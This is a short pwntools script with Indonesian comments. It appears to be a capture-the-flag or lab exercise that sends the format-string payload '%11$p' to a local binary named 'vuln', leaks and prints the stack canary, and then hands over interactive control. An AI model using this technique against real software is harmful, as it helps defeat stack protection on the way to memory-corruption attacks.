from pwn import *

# Inisialisasi proses
p = process('./vuln')

# Step 1: Kirim format string untuk leak canary
p.sendlineafter(b'Name: ', b'%11$p')

# Step 2: Baca respons dan parse canary
output = p.recvline()
canary = int(output.strip(), 16)

print(f"Canary: {hex(canary)}")

# Lanjut interaksi
p.interactive()